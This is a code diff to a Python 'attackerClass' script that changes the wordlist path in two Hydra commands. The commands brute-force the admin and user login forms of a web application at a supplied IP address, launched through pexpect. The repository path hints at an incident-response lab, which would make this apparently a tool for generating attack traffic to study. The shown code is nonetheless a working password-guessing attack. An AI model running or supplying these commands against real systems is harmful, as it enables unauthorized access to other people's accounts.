@@ -769,7 +769,7 @@ class attackerClass(object):
 
 		try:
 			print("Hydra BruteForce On Webpage (Admin) Being Executed")
-			command = "hydra -l admin -P /home/ubuntu/Documents/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
+			command = "hydra -l admin -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
 			child = pexpect.spawn(command)
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
@@ -796,7 +796,7 @@ class attackerClass(object):
 
 		try:
 			print("Hydra BruteForce On Webpage (User) Being Executed")
-			command = "hydra -l user -P /home/ubuntu/Documents/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
+			command = "hydra -l user -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
 			child = pexpect.spawn(command)
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
